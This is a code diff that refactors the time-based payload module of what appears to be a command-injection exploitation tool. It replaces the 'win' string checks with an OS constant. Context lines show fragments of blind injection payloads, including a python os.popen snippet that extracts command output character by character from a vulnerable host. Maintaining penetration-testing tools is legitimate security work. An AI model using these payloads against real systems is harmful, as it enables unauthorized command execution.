@@ -25,7 +25,7 @@ The available "time-based" payloads.
 Time-based decision payload (check if host is vulnerable).
 """
 def decision(separator, TAG, output_length, timesec, http_request_method):
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     if separator == "|" or separator == "||" :
       pipe = "|"
       payload = (pipe +
@@ -85,7 +85,7 @@ def decision(separator, TAG, output_length, timesec, http_request_method):
 __Warning__: The alternative shells are still experimental.
 """
 def decision_alter_shell(separator, TAG, output_length, timesec, http_request_method):
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"print(len(\'" + TAG + "\'))\""
     if separator == "|" or separator == "||" :
       pipe = "|"
@@ -148,7 +148,7 @@ def decision_alter_shell(separator, TAG, output_length, timesec, http_request_me
        settings.CUSTOM_HEADER_INJECTION == True:
       payload = payload.replace("\n",";")
     else:
-      if settings.TARGET_OS != "win":
+      if settings.TARGET_OS != settings.OS.WINDOWS:
         payload = payload.replace("\n","%0d")
         
   return payload
@@ -157,7 +157,7 @@ def decision_alter_shell(separator, TAG, output_length, timesec, http_request_me
 Execute shell commands on vulnerable host.
 """
 def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     if separator == "|" or separator == "||" :
       pipe = "|"
       payload = (pipe + settings.SINGLE_WHITESPACE + 
@@ -221,7 +221,7 @@ def cmd_execution(separator, cmd, output_length, timesec, http_request_method):
 __Warning__: The alternative shells are still experimental.
 """
 def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method):
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     if separator == "|" or separator == "||" :
       pipe = "|"
       payload = (pipe + settings.SINGLE_WHITESPACE + 
@@ -282,14 +282,14 @@ def cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_reque
        settings.CUSTOM_HEADER_INJECTION == True:
       payload = payload.replace("\n",";")
     else:
-      if settings.TARGET_OS != "win":
+      if settings.TARGET_OS != settings.OS.WINDOWS:
         payload = payload.replace("\n","%0d")
   return payload
 """
 Get the execution output, of shell execution.
 """
 def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     if separator == "|" or separator == "||" :
       pipe = "|"
       payload = (pipe + settings.SINGLE_WHITESPACE + 
@@ -359,7 +359,7 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
 __Warning__: The alternative shells are still experimental.
 """
 def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     python_payload = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; print(ord(os.popen('" + cmd + "').read().strip()[" + str(num_of_chars-1) + ":" + str(num_of_chars) + "]))\""
     if separator == "|" or separator == "||" :
       pipe = "|"
@@ -420,7 +420,7 @@ def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http
        settings.CUSTOM_HEADER_INJECTION == True:
       payload = payload.replace("\n",";")
     else:
-      if settings.TARGET_OS != "win":
+      if settings.TARGET_OS != settings.OS.WINDOWS:
         payload = payload.replace("\n","%0d")
   return payload
 
@@ -428,7 +428,7 @@ def get_char_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http
 Get the execution output, of shell execution.
 """
 def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     if separator == "|" or separator == "||" :
       pipe = "|"
       payload = (pipe + settings.SINGLE_WHITESPACE + 
@@ -486,7 +486,7 @@ def fp_result(separator, cmd, num_of_chars, ascii_char, timesec, http_request_me
 __Warning__: The alternative shells are still experimental.
 """
 def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, http_request_method):
-  if settings.TARGET_OS == "win":
+  if settings.TARGET_OS == settings.OS.WINDOWS:
     if separator == "|" or separator == "||" :
       pipe = "|"
       payload = (pipe + settings.SINGLE_WHITESPACE + 
@@ -544,7 +544,7 @@ def fp_result_alter_shell(separator, cmd, num_of_chars, ascii_char, timesec, htt
        settings.CUSTOM_HEADER_INJECTION == True:
       payload = payload.replace("\n",";")
     else:
-      if settings.TARGET_OS != "win":
+      if settings.TARGET_OS != settings.OS.WINDOWS:
         payload = payload.replace("\n","%0d")
   return payload
 # eof
